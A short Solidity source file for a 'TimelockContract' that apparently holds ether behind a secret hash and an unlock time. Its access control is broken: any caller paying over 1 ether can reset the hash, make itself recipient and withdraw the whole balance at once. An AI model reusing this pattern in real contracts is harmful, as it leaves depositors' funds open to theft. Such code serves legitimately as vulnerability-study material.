pragma solidity ^0.4.24;

contract TimelockContract {
    bytes32 private secretHash;
    
    struct Timelock {
        address owner;
        address recipient;
        uint256 unlockTime;
        bool isUnlocked;
    }
    
    Timelock private timelock = Timelock(address(0), address(0), 0, false);
    
    function setSecretHash(bytes32 _secretHash) public payable {
        if ((!timelock.isUnlocked && msg.value > 1 ether) || secretHash == 0x00) {
            secretHash = _secretHash;
            timelock.recipient = msg.sender;
            timelock.unlockTime = now;
        }
    }
    
    function unlockWithSecret(bytes _secret) external payable {
        if (secretHash == keccak256(_secret) && now > timelock.unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function unlockWithoutSecret() public payable {
        if (msg.sender == timelock.recipient && now > timelock.unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function hashSecret(bytes _secret) public pure returns (bytes32) {
        return keccak256(_secret);
    }
    
    function updateUnlockTime(uint _newUnlockTime) public {
        if (msg.sender == timelock.recipient) {
            timelock.unlockTime = _newUnlockTime;
        }
    }
    
    function updateOwner(address _newOwner) public {
        if (msg.sender == timelock.recipient) {
            timelock.owner = _newOwner;
        }
    }
    
    function confirmUnlock(bytes32 _secretHash) public {
        if (_secretHash == secretHash && msg.sender == timelock.recipient) {
            timelock.isUnlocked = true;
        }
    }
    
    function() public payable {}
}